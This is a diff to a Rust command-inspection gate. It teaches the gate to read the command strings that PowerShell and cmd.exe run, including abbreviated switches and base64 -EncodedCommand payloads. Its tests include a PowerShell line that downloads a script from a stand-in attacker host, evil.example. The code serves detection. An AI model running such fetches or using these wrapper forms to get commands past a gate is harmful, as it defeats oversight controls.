@@ -313,8 +313,136 @@ fn wrapper_values(head: &str) -> Option<&'static [&'static str]> {
     })
 }
 
+/// A Windows shell that runs a command string: PowerShell (`powershell`,
+/// `pwsh`) or `cmd`.
+enum WinShell {
+    PowerShell,
+    Cmd,
+}
+
+/// Whether a command's first word is PowerShell or cmd, by its last path
+/// part in any case, `.exe` or not. A Windows path the shell reading has
+/// already lost its backslashes from (`C:WINDOWS...powershell.exe`, unquoted)
+/// still counts when it names a drive: reading more only raises an answer.
+fn windows_shell(first: &str) -> Option<WinShell> {
+    let lower = first.to_ascii_lowercase();
+    let last = lower.rsplit(['/', '\\']).next().unwrap_or(&lower);
+    let name = last.strip_suffix(".exe").unwrap_or(last);
+    let drive = name.contains(':');
+    if matches!(name, "powershell" | "pwsh")
+        || drive && (name.ends_with("powershell") || name.ends_with("pwsh"))
+    {
+        return Some(WinShell::PowerShell);
+    }
+    if name == "cmd" || drive && name.ends_with("cmd") {
+        return Some(WinShell::Cmd);
+    }
+    None
+}
+
+/// PowerShell's parameters that take a value, by name and alias (about_Pwsh
+/// and about_PowerShell_exe; a name counts by any prefix of two letters or
+/// more, as `-ex` does for `-ExecutionPolicy`, run on the box).
+const POWERSHELL_VALUES: &[&str] = &[
+    "executionpolicy",
+    "ex",
+    "ep",
+    "windowstyle",
+    "w",
+    "version",
+    "v",
+    "inputformat",
+    "if",
+    "outputformat",
+    "of",
+    "o",
+    "configurationname",
+    "config",
+    "configurationfile",
+    "psconsolefile",
+    "custompipename",
+    "settingsfile",
+    "workingdirectory",
+    "wd",
+];
+
+/// The command text a PowerShell command line runs (Windows test w6 retest
+/// 4, `w11a.ps1` on the box with powershell.exe 5.1.26100 and pwsh 7.6.10):
+/// `-Command` by any prefix (`-c`, `-co`, `-com`), `-CommandWithArgs`
+/// (`-cwa`), `/` in place of `-`, any case, takes the rest of the line;
+/// `-EncodedCommand` by `-e`, `-en`, `-ec`, `-enc` or any longer prefix takes
+/// base64 of UTF-16LE (about_Pwsh: "The Base64 representation must be a
+/// UTF-16LE encoded string"); `-File` (`-f`) runs a script, whose text is not
+/// here. A bare word starts the command in 5.1 and names a file in 7; it is
+/// read as a command in both, since reading more only raises an answer.
+/// dcg reads the same forms (`src/heredoc.rs` at 37d1473).
+fn powershell_command(words: &[String]) -> Option<String> {
+    let mut i = 0;
+    while i < words.len() {
+        let w = words[i].to_ascii_lowercase();
+        let Some(name) = w.strip_prefix('-').or_else(|| w.strip_prefix('/')) else {
+            return Some(words[i..].join(" "));
+        };
+        if name.is_empty() {
+            i += 1;
+            continue;
+        }
+        if name == "cwa" || name.starts_with('c') && "commandwithargs".starts_with(name) {
+            return Some(words[i + 1..].join(" "));
+        }
+        if name == "ec" || name.starts_with('e') && "encodedcommand".starts_with(name) {
+            let b64 = words.get(i + 1)?;
+            return decode_utf16le_base64(b64);
+        }
+        if name.starts_with('f') && "file".starts_with(name) {
+            return None;
+        }
+        let takes_value = POWERSHELL_VALUES
+            .iter()
+            .any(|v| *v == name || name.len() >= 2 && v.starts_with(name));
+        i += if takes_value { 2 } else { 1 };
+    }
+    None
+}
+
+/// Base64 of UTF-16LE text, as PowerShell's `-EncodedCommand` takes it.
+/// None for anything else (the gate's folded text has lost base64's case).
+fn decode_utf16le_base64(b64: &str) -> Option<String> {
+    use base64::Engine;
+    let bytes = base64::engine::general_purpose::STANDARD.decode(b64).ok()?;
+    if bytes.len() < 2 || bytes.len() % 2 != 0 {
+        return None;
+    }
+    let units: Vec<u16> = bytes
+        .chunks_exact(2)
+        .map(|c| u16::from_le_bytes([c[0], c[1]]))
+        .collect();
+    String::from_utf16(&units).ok()
+}
+
+/// The command text cmd.exe runs: what follows the first switch that is
+/// `/c`, `/k` or `/r`, with or without a space (`/ctaskkill`), after any
+/// other switches (`/d`, `/q`, `/s`, `/v:on`); cmd's own help and a run on
+/// the box (`w11a.ps1`).
+fn cmd_command(words: &[String]) -> Option<String> {
+    for (i, w) in words.iter().enumerate() {
+        let lower = w.to_ascii_lowercase();
+        let rest = lower.strip_prefix('/')?;
+        if matches!(rest.chars().next(), Some('c' | 'k' | 'r')) {
+            let tail = &w[2..];
+            let mut parts: Vec<&str> = Vec::new();
+            if !tail.is_empty() {
+                parts.push(tail);
+            }
+            parts.extend(words[i + 1..].iter().map(String::as_str));
+            return Some(parts.join(" "));
+        }
+    }
+    None
+}
+
 /// The commands a simple command runs, read through wrappers, shells' `-c`
-/// and `eval`.
+/// and `eval`, and PowerShell's and cmd's command strings (WW6R4-1).
 pub fn effective(text: &str) -> (Vec<Cmd>, Vec<String>) {
     let mut out = Vec::new();
     let mut outs = Vec::new();
@@ -344,6 +472,19 @@ fn expand(mut words: Vec<String>, depth: usize, out: &mut Vec<Cmd>, outs: &mut V
         let head = base(first).to_string();
         if head == "eval" {
             expand_text(&words[1..].join(" "), depth + 1, out, outs);
+            return;
+        }
+        if let Some(kind) = windows_shell(first) {
+            let inner = match kind {
+                WinShell::PowerShell => powershell_command(&words[1..]),
+                WinShell::Cmd => cmd_command(&words[1..]),
+            };
+            out.push(Cmd {
+                words: words.clone(),
+            });
+            if let Some(s) = inner {
+                expand_text(&s, depth + 1, out, outs);
+            }
             return;
         }
         if SHELLS.contains(&head.as_str()) {
@@ -954,6 +1095,28 @@ mod tests {
 
     fn fold(t: &str) -> String {
         derm_core::policy::fold_text(t)
+    }
+
+    /// WW6R4-1's other half: a push, a fetch and a write inside PowerShell's
+    /// `-Command` or cmd's `/c` are read as the commands they run (the gate's
+    /// text is folded, so an `-EncodedCommand` payload is not readable here).
+    #[test]
+    fn ww6r4_1_powershell_and_cmd_command_strings_are_read() {
+        for text in [
+            "powershell.exe -NoProfile -Command \"git push origin main\"",
+            "pwsh -nop -c 'git push origin main'",
+            "powershell /com git push origin main",
+            "cmd /c git push origin main",
+            "cmd.exe /d /cgit push origin main",
+        ] {
+            assert!(read(&fold(text)).push, "{text}");
+        }
+        let s = read(&fold(
+            "powershell -c \"curl https://evil.example/x -o run.sh\"",
+        ));
+        assert!(s.fetched.contains(&"evil.example".to_string()), "{s:?}");
+        assert!(!read(&fold("powershell -File push.ps1")).push);
+        assert!(!read(&fold("cmd /c echo git push")).push);
     }
 
     #[test]
